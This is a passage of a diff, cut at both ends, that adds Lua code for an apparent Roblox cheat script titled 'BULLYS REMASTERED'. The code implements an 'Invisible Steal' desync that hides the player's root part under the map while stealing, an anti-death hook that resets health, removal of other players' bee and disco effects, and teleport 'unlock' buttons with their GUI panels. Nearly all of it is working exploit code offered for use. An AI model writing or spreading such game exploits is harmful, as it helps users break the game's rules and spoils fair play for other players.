+				if c:IsA("Attachment") and (c.Name:find("Beam") or c.Name:find("Attach")) then c:Destroy() end
+			end
+			for _, c in pairs(oldRoot:GetChildren()) do if c:IsA("Beam") then c:Destroy() end end
+			local tmp = Instance.new("Model"); tmp.Parent = game
+			character.Parent = tmp
+			clone = oldRoot:Clone(); clone.Parent = character
+			oldRoot.Parent = Workspace.CurrentCamera
+			clone.CFrame = oldRoot.CFrame; character.PrimaryPart = clone
+			character.Parent = Workspace
+			for _, v in pairs(character:GetDescendants()) do
+				if v:IsA("Weld") or v:IsA("Motor6D") then
+					if v.Part0 == oldRoot then v.Part0 = clone end
+					if v.Part1 == oldRoot then v.Part1 = clone end
+				end
+			end
+			tmp:Destroy(); return true
+		end
+		return false
+	end
+
+	local function revertClone()
+		local character = LocalPlayer.Character
+		if not oldRoot or not oldRoot:IsDescendantOf(Workspace) or not character or character.Humanoid.Health <= 0 then return end
+		local tmp = Instance.new("Model"); tmp.Parent = game
+		character.Parent = tmp
+		oldRoot.Parent = character; character.PrimaryPart = oldRoot
+		character.Parent = Workspace; oldRoot.CanCollide = true
+		for _, v in pairs(character:GetDescendants()) do
+			if v:IsA("Weld") or v:IsA("Motor6D") then
+				if v.Part0 == clone then v.Part0 = oldRoot end
+				if v.Part1 == clone then v.Part1 = oldRoot end
+			end
+		end
+		if clone then local p = clone.CFrame; clone:Destroy(); clone = nil; oldRoot.CFrame = p end
+		oldRoot = nil
+		if character and character.Humanoid then character.Humanoid.HipHeight = hip end
+		clearAllGhosts()
+	end
+
+	local function animationTrickery()
+		local character = LocalPlayer.Character
+		if character and character:FindFirstChild("Humanoid") and character.Humanoid.Health > 0 then
+			local anim = Instance.new("Animation")
+			anim.AnimationId = "http://www.roblox.com/asset/?id=18537363391"
+			local humanoid = character.Humanoid
+			local animator = humanoid:FindFirstChild("Animator") or Instance.new("Animator", humanoid)
+			local animTrack = animator:LoadAnimation(anim)
+			animTrack.Priority = Enum.AnimationPriority.Action4
+			animTrack:Play(0, 1, 0); anim:Destroy()
+			table.insert(tracks, animTrack)
+			animTrack.Stopped:Connect(function() if animPlaying then animationTrickery() end end)
+			task.delay(0, function()
+				animTrack.TimePosition = 0.7
+				task.delay(0.3, function() if animTrack then animTrack:AdjustSpeed(math.huge) end end)
+			end)
+		end
+	end
+
+	local function turnOff()
+		clearAllGhosts()
+		if not animPlaying then return end
+		local character = LocalPlayer.Character
+		local humanoid = character and character:FindFirstChildOfClass("Humanoid")
+		animPlaying = false; _G.invisibleStealEnabled = false
+		for _, t in pairs(tracks) do pcall(function() t:Stop() end) end
+		tracks = {}
+		if connection then connection:Disconnect(); connection = nil end
+		for _, c in ipairs(folderConnections) do if c then c:Disconnect() end end
+		folderConnections = {}
+		revertClone(); clearAllGhosts()
+		if humanoid then pcall(function() humanoid:ChangeState(Enum.HumanoidStateType.GettingUp) end) end
+		if _G.updateMovementPanelInvisVisual then pcall(_G.updateMovementPanelInvisVisual, false) end
+		if updateVisualState then updateVisualState(false) end
+	end
+
+	local function turnOn()
+		if animPlaying then return end
+		local character = LocalPlayer.Character
+		if not character then return end
+		local humanoid = character:FindFirstChildOfClass("Humanoid")
+		if not humanoid then return end
+		animPlaying = true; _G.invisibleStealEnabled = true
+		if _G.updateMovementPanelInvisVisual then pcall(_G.updateMovementPanelInvisVisual, true) end
+		if updateVisualState then updateVisualState(true) end
+		tracks = {}; removeFolders()
+		local success = doClone()
+		if success then
+			task.wait(0.05); animationTrickery()
+			task.defer(function()
+				if _G.resetBrainrotBeam then pcall(_G.resetBrainrotBeam) end
+				if _G.resetPlotBeam then pcall(_G.resetPlotBeam) end
+				task.wait(0.1)
+				if _G.updateBrainrotBeam then pcall(_G.updateBrainrotBeam) end
+				if _G.createPlotBeam then pcall(_G.createPlotBeam) end
+			end)
+			local lastSetPosition = nil; local skipFrames = 5
+			connection = RunService.PreSimulation:Connect(function()
+				if character and character:FindFirstChild("Humanoid") and character.Humanoid.Health > 0 and oldRoot then
+					local root = character.PrimaryPart or character:FindFirstChild("HumanoidRootPart")
+					if root then
+						if skipFrames > 0 then skipFrames = skipFrames - 1; lastSetPosition = nil
+						elseif lastSetPosition and ghostEnabled then
+							local currentPos = oldRoot.Position
+							local jumpDist = (currentPos - lastSetPosition).Magnitude
+							if jumpDist > 3 and not _G.RecoveryInProgress then
+								lastSetPosition = nil; createServerGhost(currentPos)
+								if _G.AutoRecoverLagback and _G.toggleInvisibleSteal then
+									_G.RecoveryInProgress = true
+									task.spawn(function()
+										pcall(_G.toggleInvisibleSteal); task.wait(0.5)
+										pcall(_G.toggleInvisibleSteal); _G.RecoveryInProgress = false
+									end)
+								end
+							end
+						end
+						if clone then clone.CanCollide = false end
+						for _, c in pairs(oldRoot:GetChildren()) do
+							if c:IsA("Attachment") or c:IsA("Beam") then c:Destroy() end
+						end
+						local rotAngle = _G.InvisStealAngle or 180
+						local sa = math.clamp(_G.SinkSliderValue or Config.SinkSliderValue or 2.5, 0.5, 10)
+						local cf = root.CFrame - Vector3.new(0, sa, 0)
+						oldRoot.CFrame = cf * CFrame.Angles(math.rad(rotAngle), 0, 0)
+						oldRoot.AssemblyLinearVelocity = root.AssemblyLinearVelocity; oldRoot.CanCollide = false
+						lastSetPosition = oldRoot.Position
+					end
+				end
+			end)
+		end
+	end
+
+    local invisGui = Instance.new("ScreenGui")
+    invisGui.Name = "BullysInvisPanel"
+    invisGui.ResetOnSpawn = false
+    -- Dedicated Invisible Steal panel removed: keep controls in Mini Actions / Settings only.
+    invisGui.Enabled = false
+
+    local iFrame = Instance.new("Frame", invisGui)
+    iFrame.Size = UDim2.new(0, 250, 0, 260)
+    iFrame.Position = UDim2.new(Config.Positions.InvisPanel.X, 0, Config.Positions.InvisPanel.Y, 0)
+    iFrame.BackgroundColor3 = Theme.Background
+    iFrame.BackgroundTransparency = 0.05
+    Instance.new("UICorner", iFrame).CornerRadius = UDim.new(0, 12)
+    local iStroke = Instance.new("UIStroke", iFrame)
+    iStroke.Color = Theme.Accent2
+    iStroke.Thickness = 1.5
+    iStroke.Transparency = 0.4
+    CreateGradient(iStroke)
+    task.defer(function() if addRacetrackBorder then addRacetrackBorder(iFrame, Theme.Accent1, 3) end end)
+
+    local iHeader = Instance.new("Frame", iFrame)
+    iHeader.Size = UDim2.new(1, 0, 0, 35)
+    iHeader.BackgroundTransparency = 1
+    MakeDraggable(iHeader, iFrame, "InvisPanel")
+
+    local iTitle = Instance.new("TextLabel", iHeader)
+    iTitle.Size = UDim2.new(1, -15, 1, 0)
+    iTitle.Position = UDim2.new(0, 15, 0, 0)
+    iTitle.BackgroundTransparency = 1
+    iTitle.Text = "INVISIBLE STEAL"
+    iTitle.Font = Enum.Font.GothamBlack
+    iTitle.TextSize = 14
+    iTitle.TextColor3 = Theme.TextPrimary
+    iTitle.TextXAlignment = Enum.TextXAlignment.Left
+
+    local iContainer = Instance.new("Frame", iFrame)
+    iContainer.Size = UDim2.new(1, -20, 1, -40)
+    iContainer.Position = UDim2.new(0, 10, 0, 35)
+    iContainer.BackgroundTransparency = 1
+    local iLayout = Instance.new("UIListLayout", iContainer)
+    iLayout.Padding = UDim.new(0, 8)
+    iLayout.SortOrder = Enum.SortOrder.LayoutOrder
+
+    local function CreateIRow(height)
+        local r = Instance.new("Frame", iContainer)
+        r.Size = UDim2.new(1, 0, 0, height or 30)
+        r.BackgroundTransparency = 1
+        return r
+    end
+
+    local row1 = CreateIRow(30)
+    local lbl1 = Instance.new("TextLabel", row1)
+    lbl1.Size = UDim2.new(0.6, 0, 1, 0)
+    lbl1.BackgroundTransparency = 1
+    lbl1.Text = "Toggle Invis"
+    lbl1.TextColor3 = Theme.TextPrimary
+    lbl1.Font = Enum.Font.GothamBold
+    lbl1.TextSize = 12
+    lbl1.TextXAlignment = Enum.TextXAlignment.Left
+
+    local btnInvis = Instance.new("TextButton", row1)
+    btnInvis.Size = UDim2.new(0, 40, 0, 24)
+    btnInvis.Position = UDim2.new(1, -40, 0.5, -12)
+    btnInvis.BackgroundColor3 = Theme.SurfaceHighlight
+    btnInvis.Text = "OFF"
+    btnInvis.Font = Enum.Font.GothamBold
+    btnInvis.TextSize = 11
+    btnInvis.TextColor3 = Theme.TextPrimary
+    Instance.new("UICorner", btnInvis).CornerRadius = UDim.new(0, 6)
+
+    local keyBtn = Instance.new("TextButton", row1)
+    keyBtn.Size = UDim2.new(0, 40, 0, 24)
+    keyBtn.Position = UDim2.new(1, -90, 0.5, -12)
+    keyBtn.BackgroundColor3 = Theme.Surface
+    keyBtn.Text = Config.InvisToggleKey
+    keyBtn.Font = Enum.Font.GothamBold
+    keyBtn.TextColor3 = Theme.Accent1
+    keyBtn.TextSize = 11
+    Instance.new("UICorner", keyBtn).CornerRadius = UDim.new(0, 6)
+    keyBtn.MouseButton1Click:Connect(function()
+        keyBtn.Text = "..."
+        local c
+        c = UserInputService.InputBegan:Connect(function(i)
+            if i.UserInputType == Enum.UserInputType.Keyboard then
+                Config.InvisToggleKey = i.KeyCode.Name
+                _G.INVISIBLE_STEAL_KEY = i.KeyCode
+                keyBtn.Text = i.KeyCode.Name
+                SaveConfig()
+                c:Disconnect()
+            end
+        end)
+    end)
+
+    local row2 = CreateIRow(30)
+    local lbl2 = Instance.new("TextLabel", row2)
+    lbl2.Size = UDim2.new(0.6, 0, 1, 0)
+    lbl2.BackgroundTransparency = 1
+    lbl2.Text = "Auto Fix Lagback"
+    lbl2.TextColor3 = Theme.TextPrimary
+    lbl2.Font = Enum.Font.GothamBold
+    lbl2.TextSize = 12
+    lbl2.TextXAlignment = Enum.TextXAlignment.Left
+
+    local btnFix = Instance.new("TextButton", row2)
+    btnFix.Size = UDim2.new(0, 50, 0, 24)
+    btnFix.Position = UDim2.new(1, -50, 0.5, -12)
+    btnFix.BackgroundColor3 = _G.AutoRecoverLagback and Theme.Success or Theme.SurfaceHighlight
+    btnFix.Text = _G.AutoRecoverLagback and "ON" or "OFF"
+    btnFix.Font = Enum.Font.GothamBold
+    btnFix.TextSize = 11
+    btnFix.TextColor3 = Theme.TextPrimary
+    Instance.new("UICorner", btnFix).CornerRadius = UDim.new(0, 6)
+    btnFix.MouseButton1Click:Connect(function()
+        _G.AutoRecoverLagback = not _G.AutoRecoverLagback
+        Config.AutoRecoverLagback = _G.AutoRecoverLagback
+        SaveConfig()
+        btnFix.Text = _G.AutoRecoverLagback and "ON" or "OFF"
+        btnFix.BackgroundColor3 = _G.AutoRecoverLagback and Theme.Success or Theme.SurfaceHighlight
+    end)
+
+    local function CreateFancySlider(parent, name, min, max, default, callback)
+        local frame = Instance.new("Frame", parent)
+        frame.Size = UDim2.new(1, 0, 0, 45)
+        frame.BackgroundTransparency = 1
+            local label = Instance.new("TextLabel", frame)
+            label.Size = UDim2.new(1, 0, 0, 15)
+            label.BackgroundTransparency = 1
+            label.TextColor3 = Theme.TextSecondary
+            label.Font = Enum.Font.GothamBold
+            label.TextSize = 10
+            label.TextXAlignment = Enum.TextXAlignment.Left
+            label.Text = name .. ": " .. default
+            local slideBg = Instance.new("Frame", frame)
+            slideBg.Size = UDim2.new(1, 0, 0, 6)
+            slideBg.Position = UDim2.new(0, 0, 0, 25)
+            slideBg.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
+            Instance.new("UICorner", slideBg).CornerRadius = UDim.new(1, 0)
+            slideBg.Parent = frame
+            local fill = Instance.new("Frame", slideBg)
+            fill.Size = UDim2.new(0, 0, 1, 0)
+            fill.BackgroundColor3 = Color3.fromRGB(80, 130, 180)
+            fill.ZIndex = 12
+            fill.Parent = slideBg
+            Instance.new("UICorner", fill).CornerRadius = UDim.new(1, 0)
+            local knob = Instance.new("Frame", slideBg)
+            knob.Size = UDim2.new(0, 12, 0, 12)
+            knob.BackgroundColor3 = Color3.fromRGB(200, 200, 200)
+            knob.AnchorPoint = Vector2.new(0.5, 0.5)
+            knob.Position = UDim2.new(0, 0, 0.5, 0)
+            knob.ZIndex = 13
+            knob.Parent = slideBg
+            Instance.new("UICorner", knob).CornerRadius = UDim.new(1, 0)
+            local function update(inputX)
+                local p = math.clamp((inputX - slideBg.AbsolutePosition.X) / slideBg.AbsoluteSize.X, 0, 1)
+                local val = min + (p * (max - min))
+                if max > 100 then val = math.floor(val) else val = math.floor(val*10)/10 end
+                fill.Size = UDim2.new(p, 0, 1, 0)
+                knob.Position = UDim2.new(p, 0, 0.5, 0)
+                label.Text = name .. ": " .. val
+                callback(val)
+            end
+            local dragging = false
+            slideBg.InputBegan:Connect(function(input)
+                if input.UserInputType == Enum.UserInputType.MouseButton1 then
+                    dragging = true
+                    update(input.Position.X)
+                end
+            end)
+            knob.InputBegan:Connect(function(input)
+                if input.UserInputType == Enum.UserInputType.MouseButton1 then dragging = true end
+            end)
+            UserInputService.InputEnded:Connect(function(input)
+                if input.UserInputType == Enum.UserInputType.MouseButton1 then dragging = false end
+            end)
+            UserInputService.InputChanged:Connect(function(input)
+                if dragging and input.UserInputType == Enum.UserInputType.MouseMovement then
+                    update(input.Position.X)
+                end
+            end)
+            local p = (default - min)/(max-min)
+            fill.Size = UDim2.new(p, 0, 1, 0)
+            knob.Position = UDim2.new(p, 0, 0.5, 0)
+            return frame
+    end
+
+    local rotationSliderManuallyChanged = false
+    CreateFancySlider(iContainer, "Rotation", 0, 360, Config.InvisStealAngle, function(v)
+        rotationSliderManuallyChanged = true
+        Config.InvisStealAngle = v
+        _G.InvisStealAngle = v
+        SaveConfig()
+    end)
+
+    CreateFancySlider(iContainer, "Depth", 0.5, 10, Config.SinkSliderValue, function(v)
+        Config.SinkSliderValue = v
+        _G.SinkSliderValue = v
+        SaveConfig()
+    end)
+
+
+    local function updateVisualState(on)
+        if btnInvis then
+            btnInvis.Text = on and "ON" or "OFF"
+            btnInvis.BackgroundColor3 = on and Theme.Success or Theme.SurfaceHighlight
+        end
+        if _G.updateMovementPanelInvisVisual then
+            pcall(_G.updateMovementPanelInvisVisual, on)
+        end
+    end
+
+    btnInvis.MouseButton1Click:Connect(function()
+		if _G.toggleInvisibleSteal then
+			pcall(_G.toggleInvisibleSteal)
+			updateVisualState(_G.invisibleStealEnabled or false)
+		end
+	end)
+
+	_G.toggleInvisibleSteal = function()
+		if animPlaying then turnOff() else turnOn() end
+	end
+
+	UserInputService.InputBegan:Connect(function(input)
+		if UserInputService:GetFocusedTextBox() then return end
+		if input.KeyCode == (_G.INVISIBLE_STEAL_KEY or Enum.KeyCode.V) then
+			pcall(_G.toggleInvisibleSteal)
+			if _G.updateMovementPanelInvisVisual then pcall(_G.updateMovementPanelInvisVisual, _G.invisibleStealEnabled or false) end
+			if updateVisualState then updateVisualState(_G.invisibleStealEnabled or false) end
+		end
+	end)
+
+	local function onCharacterAdded(newChar)
+		clearErrorOrb(); clearAllGhosts(); lagbackCallCount = 0
+		pcall(function() for _, c in pairs(Workspace.CurrentCamera:GetChildren()) do if c:IsA("BasePart") and c.Name == "HumanoidRootPart" then c:Destroy() end end end)
+		if oldRoot then pcall(function() oldRoot:Destroy() end); oldRoot = nil end
+		if clone then pcall(function() clone:Destroy() end); clone = nil end
+		animPlaying = false; _G.invisibleStealEnabled = false
+		if _G.updateMovementPanelInvisVisual then pcall(_G.updateMovementPanelInvisVisual, false) end
+		task.wait(0.2)
+		local camera = Workspace.CurrentCamera
+		if camera and newChar then
+			local h = newChar:FindFirstChildOfClass("Humanoid")
+			if h then camera.CameraSubject = h; camera.CameraType = Enum.CameraType.Custom end
+		end
+	end
+    LocalPlayer.CharacterAdded:Connect(onCharacterAdded)
+
+    local function setupDeathListener()
+        local ch = LocalPlayer.Character
+        if ch then
+            local h = ch:FindFirstChildOfClass("Humanoid")
+            if h then h.Died:Connect(function() clearErrorOrb(); clearAllGhosts(); lagbackCallCount = 0 end) end
+        end
+    end
+    setupDeathListener()
+    LocalPlayer.CharacterAdded:Connect(function() task.wait(0.1); setupDeathListener() end)
+
+    task.spawn(function()
+        local currentConnection = nil
+        _G.AntiDieConnection = nil
+        _G.AntiDieDisabled = false
+        local function setupAntiDie()
+            if _G.AntiDieDisabled then return end
+            local character = LocalPlayer.Character
+            if not character then return end
+            local humanoid = character:FindFirstChildOfClass("Humanoid")
+            if not humanoid then return end
+            if currentConnection then pcall(function() currentConnection:Disconnect() end) end
+            currentConnection = humanoid:GetPropertyChangedSignal("Health"):Connect(function()
+                if _G.AntiDieDisabled then return end
+                if humanoid.Health <= 0 then
+                    humanoid.Health = humanoid.MaxHealth
+                end
+            end)
+            _G.AntiDieConnection = currentConnection
+        end
+        _G.setupAntiDie = setupAntiDie
+        setupAntiDie()
+        LocalPlayer.CharacterAdded:Connect(function()
+            task.wait(0.5)
+            if not _G.AntiDieDisabled then
+                setupAntiDie()
+            end
+        end)
+    end)
+end)
+
+task.spawn(function()
+    local wasStealingForInvis = false
+    local invisWasEnabledBefore = false
+    local autoEnabledInvis = false
+    task.wait(1)
+    while task.wait(0.1) do
+        if _G.AutoInvisDuringSteal == false then
+            wasStealingForInvis = false
+            autoEnabledInvis = false
+        else
+            local isStealing = LocalPlayer:GetAttribute("Stealing")
+            if isStealing and not wasStealingForInvis then
+                invisWasEnabledBefore = _G.invisibleStealEnabled or false
+                if not _G.invisibleStealEnabled and _G.toggleInvisibleSteal then
+                    task.delay(0.25, function()
+                        if LocalPlayer:GetAttribute("Stealing") and not _G.invisibleStealEnabled then
+                            pcall(_G.toggleInvisibleSteal)
+                            autoEnabledInvis = true
+                        end
+                    end)
+                end
+            end
+            if not isStealing and autoEnabledInvis and _G.invisibleStealEnabled and _G.toggleInvisibleSteal then
+                pcall(_G.toggleInvisibleSteal)
+                autoEnabledInvis = false
+            end
+            wasStealingForInvis = isStealing
+        end
+    end
+end)
+
+SharedState.FOV_MANAGER = {
+    activeCount = 0,
+    conn = nil,
+    forcedFOV = 70,
+}
+function SharedState.FOV_MANAGER:Start()
+    if self.conn then return end
+    self.forcedFOV = Config.FOV or 70
+    self.conn = RunService.RenderStepped:Connect(function()
+        local cam = Workspace.CurrentCamera
+        if cam then
+            local targetFOV = Config.FOV or self.forcedFOV
+            if cam.FieldOfView ~= targetFOV then
+                cam.FieldOfView = targetFOV
+            end
+        end
+    end)
+end
+function SharedState.FOV_MANAGER:Stop()
+    if self.conn then
+        self.conn:Disconnect()
+        self.conn = nil
+    end
+end
+function SharedState.FOV_MANAGER:Push()
+    self.activeCount = self.activeCount + 1
+    self:Start()
+end
+function SharedState.FOV_MANAGER:Pop()
+    if self.activeCount > 0 then
+        self.activeCount = self.activeCount - 1
+    end
+    if self.activeCount == 0 then
+        self:Stop()
+    end
+end
+
+SharedState.ANTI_BEE_DISCO = {
+    running = false,
+    connections = {},
+    originalMoveFunction = nil,
+    controlsProtected = false,
+    badLightingNames = { Blue = true, DiscoEffect = true, BeeBlur = true, ColorCorrection = true },
+}
+function SharedState.ANTI_BEE_DISCO.nuke(obj)
+    if not obj or not obj.Parent then return end
+    if SharedState.ANTI_BEE_DISCO.badLightingNames[obj.Name] then
+        pcall(function() obj:Destroy() end)
+    end
+end
+function SharedState.ANTI_BEE_DISCO.disconnectAll()
+    for _, conn in ipairs(SharedState.ANTI_BEE_DISCO.connections) do
+        if typeof(conn) == "RBXScriptConnection" then conn:Disconnect() end
+    end
+    SharedState.ANTI_BEE_DISCO.connections = {}
+end
+function SharedState.ANTI_BEE_DISCO.protectControls()
+    if SharedState.ANTI_BEE_DISCO.controlsProtected then return end
+    pcall(function()
+        local PlayerScripts = LocalPlayer.PlayerScripts
+        local PlayerModule = PlayerScripts:FindFirstChild("PlayerModule")
+        if not PlayerModule then return end
+        local Controls = require(PlayerModule):GetControls()
+        if not Controls then return end
+        local ab = SharedState.ANTI_BEE_DISCO
+        if not ab.originalMoveFunction then ab.originalMoveFunction = Controls.moveFunction end
+        local function protectedMoveFunction(self, moveVector, relativeToCamera)
+            if ab.originalMoveFunction then ab.originalMoveFunction(self, moveVector, relativeToCamera) end
+        end
+        table.insert(ab.connections, RunService.Heartbeat:Connect(function()
+            if not ab.running or not Config.AntiBeeDisco then return end
+            if Controls.moveFunction ~= protectedMoveFunction then Controls.moveFunction = protectedMoveFunction end
+        end))
+        Controls.moveFunction = protectedMoveFunction
+        ab.controlsProtected = true
+    end)
+end
+function SharedState.ANTI_BEE_DISCO.restoreControls()
+    if not SharedState.ANTI_BEE_DISCO.controlsProtected then return end
+    pcall(function()
+        local PlayerModule = LocalPlayer.PlayerScripts:FindFirstChild("PlayerModule")
+        if not PlayerModule then return end
+        local Controls = require(PlayerModule):GetControls()
+        local ab = SharedState.ANTI_BEE_DISCO
+        if Controls and ab.originalMoveFunction then
+            Controls.moveFunction = ab.originalMoveFunction
+            ab.controlsProtected = false
+        end
+    end)
+end
+function SharedState.ANTI_BEE_DISCO.blockBuzzingSound()
+    pcall(function()
+        local beeScript = LocalPlayer.PlayerScripts:FindFirstChild("Bee", true)
+        if beeScript then
+            local buzzing = beeScript:FindFirstChild("Buzzing")
+            if buzzing and buzzing:IsA("Sound") then buzzing:Stop(); buzzing.Volume = 0 end
+        end
+    end)
+end
+function SharedState.ANTI_BEE_DISCO.Enable()
+    local ab = SharedState.ANTI_BEE_DISCO
+    if ab.running then return end
+    ab.running = true
+    for _, inst in ipairs(Lighting:GetDescendants()) do ab.nuke(inst) end
+    table.insert(ab.connections, Lighting.DescendantAdded:Connect(function(obj)
+        if not ab.running or not Config.AntiBeeDisco then return end
+        ab.nuke(obj)
+    end))
+    ab.protectControls()
+    table.insert(ab.connections, RunService.Heartbeat:Connect(function()
+        if not ab.running or not Config.AntiBeeDisco then return end
+        ab.blockBuzzingSound()
+    end))
+    SharedState.FOV_MANAGER:Push()
+    ShowNotification("ANTI-BEE & DISCO", "Enabled")
+end
+function SharedState.ANTI_BEE_DISCO.Disable()
+    local ab = SharedState.ANTI_BEE_DISCO
+    if not ab.running then return end
+    ab.running = false
+    ab.restoreControls()
+    ab.disconnectAll()
+    SharedState.FOV_MANAGER:Pop()
+    ShowNotification("ANTI-BEE & DISCO", "Disabled")
+end
+
+_G.ANTI_BEE_DISCO = SharedState.ANTI_BEE_DISCO
+
+if Config.AntiBeeDisco then
+    task.delay(1, function()
+        if SharedState.ANTI_BEE_DISCO.Enable then SharedState.ANTI_BEE_DISCO.Enable() end
+    end)
+end
+
+task.spawn(function()
+    while true do
+        if Workspace.CurrentCamera then
+            if Config.FOV and Config.FOV ~= Workspace.CurrentCamera.FieldOfView then
+                Workspace.CurrentCamera.FieldOfView = Config.FOV
+            end
+        end
+        task.wait(0.1)
+    end
+end)
+
+task.spawn(function()
+    -- Destroi e reconstroi o HUD (chamado tambem pelo applyTheme)
+    local function buildHUD()
+        local existing = PlayerGui:FindFirstChild("BullysStatusHUD")
+        if existing then existing:Destroy() end
+
+        local hudGui = Instance.new("ScreenGui")
+        hudGui.Name = "BullysStatusHUD"
+        hudGui.ResetOnSpawn = false
+        hudGui.DisplayOrder = 10
+        hudGui.Parent = PlayerGui
+
+        -- Painel principal - estilo clean/low opacity igual nova UI
+        local main = Instance.new("Frame", hudGui)
+        main.Name = "Main"
+        main.Size = UDim2.new(0, 460, 0, 44)
+        main.Position = UDim2.new(0.5, -230, 1, -125)
+        main.BackgroundColor3 = Theme.Background
+        main.BackgroundTransparency = 0.25
+        main.BorderSizePixel = 0
+        Instance.new("UICorner", main).CornerRadius = UDim.new(0, 10)
+
+        local mainStroke = Instance.new("UIStroke", main)
+        mainStroke.Color = Theme.Accent1
+        mainStroke.Thickness = 1.2
+        mainStroke.Transparency = 0.55
+
+        -- Barra lateral accent
+        local bar = Instance.new("Frame", main)
+        bar.Size = UDim2.new(0, 3, 0, 22)
+        bar.Position = UDim2.new(0, 10, 0.5, -11)
+        bar.BackgroundColor3 = Theme.Accent1
+        bar.BorderSizePixel = 0
+        Instance.new("UICorner", bar).CornerRadius = UDim.new(0, 2)
+
+        -- Titulo
+        local title = Instance.new("TextLabel", main)
+        title.Size = UDim2.new(0, 110, 1, 0)
+        title.Position = UDim2.new(0, 18, 0, 0)
+        title.BackgroundTransparency = 1
+        title.Text = "BULLYS REMASTERED"
+        title.Font = Enum.Font.GothamBlack
+        title.TextSize = 14
+        title.TextColor3 = Theme.TextPrimary
+        title.TextXAlignment = Enum.TextXAlignment.Left
+
+        -- Autores
+        local authors = Instance.new("TextLabel", main)
+        authors.Size = UDim2.new(0, 150, 1, 0)
+        authors.Position = UDim2.new(0, 122, 0, 0)
+        authors.BackgroundTransparency = 1
+        authors.Text = "@branc"
+        authors.Font = Enum.Font.GothamBold
+        authors.TextSize = 10
+        authors.TextColor3 = Theme.TextSecondary
+        authors.TextXAlignment = Enum.TextXAlignment.Left
+
+        -- FPS / PING
+        local stats = Instance.new("TextLabel", main)
+        stats.Size = UDim2.new(0, 160, 1, 0)
+        stats.Position = UDim2.new(1, -168, 0, 0)
+        stats.BackgroundTransparency = 1
+        stats.RichText = true
+        stats.Text = ""
+        stats.Font = Enum.Font.GothamBold
+        stats.TextSize = 12
+        stats.TextColor3 = Theme.TextPrimary
+        stats.TextXAlignment = Enum.TextXAlignment.Right
+
+        local fr2, ac3 = 0, 0
+        RunService.Heartbeat:Connect(function(dt)
+            fr2 += 1; ac3 += dt
+            if ac3 >= 1 then
+                local ping3 = math.floor(LocalPlayer:GetNetworkPing()*1000)
+                local fc3 = fr2>=50 and "rgb(80,255,150)" or (fr2>=30 and "rgb(255,210,80)" or "rgb(255,80,80)")
+                local pc3 = ping3<100 and "rgb(80,255,150)" or (ping3<200 and "rgb(255,210,80)" or "rgb(255,80,80)")
+                stats.Text = string.format(
+                    "<font color='rgb(140,140,160)'>FPS:</font> <font color='%s'><b>%d</b></font>  <font color='rgb(140,140,160)'>PING:</font> <font color='%s'><b>%dms</b></font>",
+                    fc3, fr2, pc3, ping3
+                )
+                fr2, ac3 = 0, 0
+            end
+        end)
+
+        -- Unlock buttons (pos | 1 2 3)
+        local unlockContainer = Instance.new("Frame", hudGui)
+        unlockContainer.Name = "UnlockButtonsContainer"
+        unlockContainer.Size = UDim2.new(0, 260, 0, 44)
+        unlockContainer.Position = UDim2.new(0.5, -130, 1, -178)
+        unlockContainer.BackgroundTransparency = 1
+        unlockContainer.Visible = Config.ShowUnlockButtonsHUD or false
+        unlockContainer.ZIndex = 10
+
+        local uLayout = Instance.new("UIListLayout", unlockContainer)
+        uLayout.FillDirection = Enum.FillDirection.Horizontal
+        uLayout.Padding = UDim.new(0, 8)
+        uLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
+        uLayout.VerticalAlignment = Enum.VerticalAlignment.Center
+
+        -- Unlock Pos button (first, before floor numbers)
+        do
+            local posBtn = Instance.new("TextButton", unlockContainer)
+            posBtn.Size = UDim2.new(0, 80, 0, 40)
+            posBtn.BackgroundColor3 = Theme.Surface
+            posBtn.BackgroundTransparency = 0.2
+            posBtn.Text = "Unlock Pos"
+            posBtn.Font = Enum.Font.GothamBlack
+            posBtn.TextSize = 12
+            posBtn.TextColor3 = Theme.TextPrimary
+            posBtn.BorderSizePixel = 0
+            posBtn.AutoButtonColor = false
+            Instance.new("UICorner", posBtn).CornerRadius = UDim.new(0, 8)
+            local posStroke = Instance.new("UIStroke", posBtn)
+            posStroke.Color = Theme.Accent1
+            posStroke.Thickness = 1.2
+            posStroke.Transparency = 0.45
+            posBtn.MouseEnter:Connect(function()
+                TweenService:Create(posBtn, TweenInfo.new(0.1), {BackgroundTransparency=0}):Play()
+                TweenService:Create(posStroke, TweenInfo.new(0.1), {Transparency=0.1}):Play()
+            end)
+            posBtn.MouseLeave:Connect(function()
+                TweenService:Create(posBtn, TweenInfo.new(0.1), {BackgroundTransparency=0.2}):Play()
+                TweenService:Create(posStroke, TweenInfo.new(0.1), {Transparency=0.45}):Play()
+            end)
+            posBtn.MouseButton1Click:Connect(function()
+                -- Set global flag so teleportBelowPet and the autoback loop both bail out
+                _G.posUnlocked = true
+                -- Stop the autoback thread and destroy the BodyPosition lock
+                if _G.stopAutoBack then pcall(_G.stopAutoBack) end
+                local char = LocalPlayer.Character
+                local hrp = char and char:FindFirstChild("HumanoidRootPart")
+                if hrp then
+                    local bp = hrp:FindFirstChild("TP_BodyPosition")
+                    if bp then bp:Destroy() end
+                end
+                ShowNotification("UNLOCK POS", "Position freed!")
+            end)
+        end
+
+        local unlockLevels = {-2, 15, 32}
+        for i = 1, 3 do
+            local btn = Instance.new("TextButton", unlockContainer)
+            btn.Size = UDim2.new(0, 48, 0, 40)
+            btn.BackgroundColor3 = Theme.Surface
+            btn.BackgroundTransparency = 0.2
+            btn.Text = tostring(i)
+            btn.Font = Enum.Font.GothamBlack
+            btn.TextSize = 16
+            btn.TextColor3 = Theme.TextPrimary
+            btn.BorderSizePixel = 0
+            btn.AutoButtonColor = false
+            Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 8)
+            local bs = Instance.new("UIStroke", btn)
+            bs.Color = Theme.Accent1
+            bs.Thickness = 1.2
+            bs.Transparency = 0.45
+            local lvl = unlockLevels[i]
+            btn.MouseEnter:Connect(function()
+                TweenService:Create(btn, TweenInfo.new(0.1), {BackgroundTransparency=0}):Play()
+                TweenService:Create(bs, TweenInfo.new(0.1), {Transparency=0.1}):Play()
+            end)
+            btn.MouseLeave:Connect(function()
+                TweenService:Create(btn, TweenInfo.new(0.1), {BackgroundTransparency=0.2}):Play()
+                TweenService:Create(bs, TweenInfo.new(0.1), {Transparency=0.45}):Play()
+            end)
+            btn.MouseButton1Click:Connect(function()
+                triggerClosestUnlock(lvl)
+                ShowNotification("UNLOCK", "Level "..i)
+            end)
+        end
+
+        -- Resize main if unlock visible
+        if Config.ShowUnlockButtonsHUD then
+            main.Size = UDim2.new(0, 460, 0, 44)
+        end
+
+        -- Racetrack border
